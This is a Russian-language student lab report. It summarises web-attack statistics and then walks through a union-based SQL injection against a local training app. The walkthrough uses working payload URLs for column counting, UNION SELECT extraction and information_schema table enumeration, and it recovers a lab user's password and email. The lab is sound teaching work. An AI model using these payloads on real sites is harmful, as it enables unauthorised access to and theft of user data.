# Лабораторная работа по информационной безопасности
## Часть 1. Анализ отчетов

### Использованные источники
1. Verizon Data Breach Investigations Report (DBIR) 2025 — [ссылка](https://www.verizon.com/business/resources/reports/dbir/)
2. IBM X-Force Threat Intelligence Index 2025 — [ссылка](...)
3. Positive Technologies: Ландшафт киберугроз 2025 (Россия) — [ссылка](...)

### Доля атак через веб-уязвимости

- Глобально (Verizon DBIR 2025): **20%** всех нарушений данных.
- Глобально (IBM X-Force 2025): **30%** атак на публичные приложения.
- Россия/СНГ (Positive Technologies): **31%** успешных атак через эксплуатацию уязвимостей.

### Распределение по конкретным уязвимостям (2025)

| Уязвимость                        | Доля          | Источник              |
|-----------------------------------|---------------|-----------------------|
| Broken Access Control (A01)       | ~29%          | OWASP Top 10          |
| SQL Injection                     | 15–28%        | Edgescan / OWASP      |
| XSS                               | 13–20%        | Deepstrike / CNews    |
| Security Misconfiguration         | ~22%          | OWASP                 |
| Supply Chain Attacks              | 17–31%        | WEF / Kaspersky       |

**Вывод:** Веб-уязвимости остаются одним из самых популярных векторов атак как в мире, так и в России. Наиболее опасны Broken Access Control и SQL Injection.

## Часть 2. Практическая эксплуатация SQL-инъекции

### 1. Исследование уязвимого приложения

Уязвимый параметр: `?id=` (страница `/task/`)

**Тесты:**

- `http://localhost:8080/task/?id=1`  
  Ответ: `Ваш id:1 Ваш логин:admin`

- `http://localhost:8080/task/?id=2`  
  Ответ: `Ваш id:2 Ваш логин:Volk`

- `http://localhost:8080/task/?id=3`  
  Ответ: `Ваш id:3 Ваш логин:Matroskin`

- `http://localhost:8080/task/?id=4`  
  Ответ: `Ваш id:4 Ваш логин:Vinni-pukh`

- `http://localhost:8080/task/?id=5`  
  Ответ: `Ваш id:5 Ваш логин:Neznaika`

- `http://localhost:8080/task/?id=6`  
  Ответ: `Ваш id:6 Ваш логин:kotenok`

- `http://localhost:8080/task/?id=7`  
  Ответ: `Ваш id:7 Ваш логин:Karlson`

- `http://localhost:8080/task/?id=8`  
  Ответ: `Ваш id:8 Ваш логин:Kesha`

- `http://localhost:8080/task/?id=9`  
  Ответ: `Ваш id:9 Ваш логин:Volk2`

Таким образом, пользователь **Volk2** имеет `id = 9`, а пользователь **Vinni-pukh** имеет `id = 4`.

## Проверка на SQL-инъекцию

Пробую передать одинарную кавычку:

http://localhost:8080/task/?id=1'  
Ответ:  
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`

Приложение уязвимо к **SQL Injection**.

## Определение количества столбцов

Пробую `ORDER BY`:

- `http://localhost:8080/task/?id=1%27%20ORDER%20BY%201--%20` → успешно  
- `http://localhost:8080/task/?id=1%27%20ORDER%20BY%202--%20` → успешно  
- `http://localhost:8080/task/?id=1%27%20ORDER%20BY%203--%20` → успешно  
- `http://localhost:8080/task/?id=1%27%20ORDER%20BY%204--%20` → ошибка (`Unknown column '4' in 'order clause'`)

Вывод: исходный запрос возвращает 3 столбца.

## Получение пароля пользователя Volk2

Пробую UNION SELECT. Сначала пытаюсь угадать имена полей.

Запрос с полем `user` — ошибка (`Unknown column 'user'`).  
Запрос с полем `username`:

http://localhost:8080/task/?id=-1' union select id,username,password from users where id=9 --  

Вывод: 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1'

Пробую:
http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20

Вывод:Ваш id:9
Ваш логин:Volk2

Меняю порядок колонок, чтобы пароль попал в видимое поле:

http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20

Ваш id: Wa spoiuuuuu  
Ваш логин: 9

**Пароль пользователя Volk2 = Wa spoiuuuuu**

## Получение email пользователя Vinni-pukh (4 балла)

Использую тот же рабочий шаблон:

http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,password%20from%20users%20where%20id=4%20--%20

Вывод:
Unknown column 'email' in 'field list'

В таблице было 3 столбика: юзер, айди, пароль. Значит почта в другой таблице. Пробую найти ее:
http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20

Вывод:
Ваш id:emails,users
Ваш логин:1

Значит, есть 2 таблицы, перехожу к таблице email.Пробую найти email в этой таблице:
http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,3%20from%20emails%20where%20id=4%20--%20

Вывод:
Unknown column 'email' in 'field list'

Пробую email_id:
http://localhost:8080/task/?id=-1%27%20union%20select%20id,email_id,3%20from%20emails%20where%20id=4%20--%20

Вывод:
Ваш id:4
Ваш логин:honey_lover@otus-lab.com

По id нашли email Vinni-pukh. Ответ: honey_lover@otus-lab.com


В ходе выполнения лабораторной работы было обнаружено, что приложение уязвимо к **Union-based SQL-инъекции**.  
Исходный запрос возвращает 3 столбца (`id`, `username`, `password`).  
Путём изменения порядка колонок в `UNION SELECT` удалось вывести конфиденциальные данные (пароль и email) в видимые поля страницы.

# Ответ:
Пароль Volk2 - Wa spoiuuuuu
Почта Vinni-pukh - honey_lover@otus-lab.com
